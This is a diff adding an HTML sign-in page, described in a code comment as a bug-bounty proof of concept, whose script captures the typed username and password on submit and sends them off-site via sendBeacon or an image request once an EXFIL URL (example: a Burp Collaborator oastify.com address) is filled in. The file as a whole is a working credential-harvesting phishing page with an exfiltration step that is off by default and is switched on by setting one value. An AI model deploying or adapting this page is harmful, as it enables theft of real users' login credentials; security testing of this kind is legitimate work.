@@ -1,0 +1,45 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Sign in</title>
+<style>
+  *{margin:0;box-sizing:border-box;font-family:-apple-system,Segoe UI,Roboto,Arial,sans-serif}
+  html,body{height:100%}
+  body{background:#f3f4f6;display:flex;align-items:center;justify-content:center}
+  .card{background:#fff;border:1px solid #e5e7eb;border-radius:10px;box-shadow:0 4px 20px rgba(0,0,0,.08);width:340px;padding:34px 36px}
+  h1{font-size:20px;color:#111827;margin-bottom:4px}
+  .sub{color:#6b7280;font-size:13px;margin-bottom:22px}
+  label{display:block;font-size:12px;color:#374151;margin:12px 0 4px}
+  input{width:100%;padding:10px 12px;border:1px solid #d1d5db;border-radius:6px;font-size:14px}
+  button{margin-top:22px;width:100%;padding:11px;background:#2563eb;color:#fff;border:0;border-radius:6px;font-size:15px;cursor:pointer}
+  #out{margin-top:14px;font-size:12px;color:#b91c1c;white-space:pre-wrap;line-height:1.5}
+</style></head>
+<body>
+  <form class="card" id="f" autocomplete="on">
+    <h1>Sign in</h1>
+    <div class="sub">Enter your credentials to continue</div>
+    <label for="u">Username</label>
+    <input id="u" name="username" autocomplete="username">
+    <label for="p">Password</label>
+    <input id="p" name="password" type="password" autocomplete="current-password">
+    <button type="submit">Sign in</button>
+    <div id="out"></div>
+  </form>
+<script>
+  // Bug-bounty PoC. Set EXFIL to your own Burp Collaborator / listener to demonstrate
+  // off-site credential capture. Left empty => display locally only (non-malicious default).
+  var EXFIL = "";  // e.g. "https://xxxx.oastify.com/c"
+  document.getElementById('f').addEventListener('submit', function (e) {
+    e.preventDefault();
+    var creds = { u: document.getElementById('u').value, p: document.getElementById('p').value };
+    if (EXFIL) {
+      try { navigator.sendBeacon(EXFIL, JSON.stringify(creds)); }
+      catch (_) { new Image().src = EXFIL + "?u=" + encodeURIComponent(creds.u) + "&p=" + encodeURIComponent(creds.p); }
+    }
+    document.getElementById('out').textContent =
+      "[PoC] credentials captured by attacker page (" + location.origin + ")\n" +
+      "user = " + creds.u + "\npass = " + creds.p +
+      (EXFIL ? "\nexfiltrated to " + EXFIL : "\n(set EXFIL to send off-site)");
+  });
+</script>
+</body></html>
